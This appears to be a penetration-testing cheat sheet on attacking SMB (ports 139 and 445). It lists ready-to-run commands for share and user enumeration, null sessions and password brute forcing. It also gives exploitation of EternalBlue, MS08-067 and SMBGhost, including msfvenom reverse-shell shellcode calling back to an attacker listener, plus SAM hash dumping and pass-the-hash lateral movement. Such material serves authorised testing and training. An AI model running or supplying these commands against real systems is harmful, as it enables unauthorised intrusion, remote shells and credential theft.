# Port 139, 445 - SMB

## Table of Contents

- [Enumeration](#enumeration)
  - [Check Connect](#check-connect)
  - [Nmap Scripts](#nmap-scripts)
  - [Smbmap](#smbmap)
  - [SMB Null Session](#smb-null-session)
- [Brute Force](#brute-force)
  - [Enum4linux](#enum4linux)
  - [Hydra](#hydra)
- [CVE Exploitation](#cve-exploitation)
  - [MS17-010 (EternalBlue)](#ms17-010-eternalblue)
  - [MS08-067 (Netapi)](#ms08-067-netapi)
  - [SMBGhost (CVE-2020-0796)](#smbghost-cve-2020-0796)
- [Post-Exploitation](#post-exploitation)
  - [Hash Dumping](#hash-dumping)
  - [Lateral Movement](#lateral-movement)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Note: Quote the script pattern to prevent zsh/bash wildcard expansion
nxc smb $rhost -u '' -p '' && smbclient -N -L $rhost && nmap -p 445 --script "smb-vuln*" $rhost
```

### Check Connect

#### NetExec

```shell
nxc smb $rhost -u '' -p '' --local-auth --continue-on-success --no-bruteforce
```

#### Smbclient

- List Share Folder
  - Anonymous

    ```shell
    smbclient -N -L $rhost
    ```

  - User
    - Pass

      ```shell
      smbclient -U 'msfadmin' --password='msfadmin' -L $rhost
      ```

    - Hash

      ```shell
      smbclient -U 'msfadmin' --pw-nt-hash 'ntlm' -L $rhost
      ```

- Connect Share Folder
  - Anonymous

    ```shell
    smbclient -N \\\\$rhost\\tmp
    ```

  - User
    - Pass

      ```shell
      smbclient -U 'msfadmin' --password='msfadmin' \\\\$rhost\\tmp
      ```

    - Hash

      ```shell
      smbclient -U 'msfadmin' --pw-nt-hash 'hash' \\\\$rhost\\tmp
      ```

### Nmap Scripts

```shell
# SMB protocols
nmap --script "smb-protocols" -p 445 $rhost

# Enumerate shares and users
nmap -p 445 --script=smb-enum-shares,smb-enum-users $rhost

# Security mode
nmap -p 445 --script=smb-security-mode $rhost

# SMB brute force
nmap -p 445 --script "smb-brute" $rhost
```

### Vulnerability Scanning

> âš ï¸ **Important**: Quote script patterns to prevent shell wildcard expansion (zsh: `no matches found`)

```shell
# All SMB vulnerability scripts (quote for zsh compatibility)
nmap -p 445 --script "smb-vuln*" $rhost

# With OS discovery (required dependency for some scripts)
nmap -p 445 --script "smb-os-discovery,smb-vuln*" $rhost
```

> **CVE-2017-7494 (SambaCry)** - Requires `smb-os-discovery` dependency

```shell
# This script has dependencies - run with smb-os-discovery
nmap -p 445 --script "smb-os-discovery,smb-vuln-cve-2017-7494" $rhost

# With version check argument
nmap -p 445 --script "smb-vuln-cve-2017-7494" \
  --script-args smb-vuln-cve-2017-7494.check-version=true $rhost
```

| Script | Dependencies | Notes |
| --- | --- | --- |
| smb-vuln-ms10-054 | None | Runs directly |
| smb-vuln-ms10-061 | None | Runs directly |
| smb-vuln-ms17-010 | None | EternalBlue |
| smb-vuln-cve-2017-7494 | smb-os-discovery | SambaCry - skipped without dependency |
| smb-vuln-cve-2020-0796 | None | SMBGhost |

### Smbmap

```shell
# Basic enumeration
smbmap -H $rhost

# With credentials
smbmap -H $rhost -u username -p password

# Recursive enumeration
smbmap -H $rhost -u username -p password -r
```

### SMB Null Session

```shell
# Using rpcclient
rpcclient -U "" $rhost

# Using smbmap
smbmap -H $rhost -u "" -p ""
```

---

## Brute Force

### Enum4linux

```shell
enum4linux -a $rhost
enum4linux -a -u "user" -p "pass" $rhost
```

### Hydra

```shell
hydra -l administrator -P passwords.txt smb://$rhost
hydra -L users.txt -P passwords.txt smb://$rhost
```

---

## CVE Exploitation

### MS17-010 (EternalBlue)

> Scan for vulnerability

```shell
nmap -p 445 --script "smb-vuln-ms17-010" $rhost
nxc smb $rhost -u '' -p '' -M ms17-010
```

> Metasploit exploitation

```shell
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $rhost; set LHOST $lhost; exploit"
```

> Manual exploitation (without Metasploit)

```shell
# Clone AutoBlue
git clone https://github.com/3ndG4me/AutoBlue-MS17-010 && cd AutoBlue-MS17-010

# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o sc_x64.bin EXITFUNC=thread
./shell_prep.sh

# Start listener
nc -lvnp $lport

# Exploit
python3 eternalblue_exploit7.py $rhost shellcode/sc_all.bin
```

### MS08-067 (Netapi)

> Metasploit one-liner

```shell
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOSTS $rhost; set LHOST $lhost; exploit"
```

### SMBGhost (CVE-2020-0796)

> Scan for vulnerability

```shell
nmap -p 445 --script "smb-vuln-cve-2020-0796" $rhost
nxc smb $rhost -u '' -p '' -M smbghost
```

> Metasploit one-liner

```shell
msfconsole -q -x "use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS $rhost; set LHOST $lhost; exploit"
```

> Manual exploitation (LPE - requires initial access)

```shell
# Clone and compile
git clone https://github.com/danigargu/CVE-2020-0796 && cd CVE-2020-0796
# Transfer to target and run for local privilege escalation
```

---

## Post-Exploitation

> **ðŸ“– For complete SMB-based lateral movement, see [Lateral Movement](../../5.Lateral-Movement/5.1.Lateral-Movement.md) | [NTLM Relay](../../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)**

### Hash Dumping

```shell
# Using secretsdump
impacket-secretsdump domain/user:password@$rhost

# SAM extraction
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system
```

### Lateral Movement

```shell
# Pass-the-Hash (hash format: LMHASH:NTHASH)
pth-winexe -U domain/username%aad3b435b51404eeaad3b435b51404ee:NTHASH //$rhost cmd
```

---

## See Also

- **[Lateral Movement](../../5.Lateral-Movement/5.1.Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash
- **[NTLM Relay & Responder](../../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - SMB relay attacks
- **[AD Exploitation](../../3.AD-Exploit/3.1.AD-Exploitation.md)** - AD enumeration via SMB
- **[Password Attacks](../../3.AD-Exploit/3.2.Password-Attacks.md)** - SMB brute force, credential dumping
- **[Persistence Techniques](../../5.Lateral-Movement/5.4.Persistence-Techniques.md)** - Post-exploitation persistence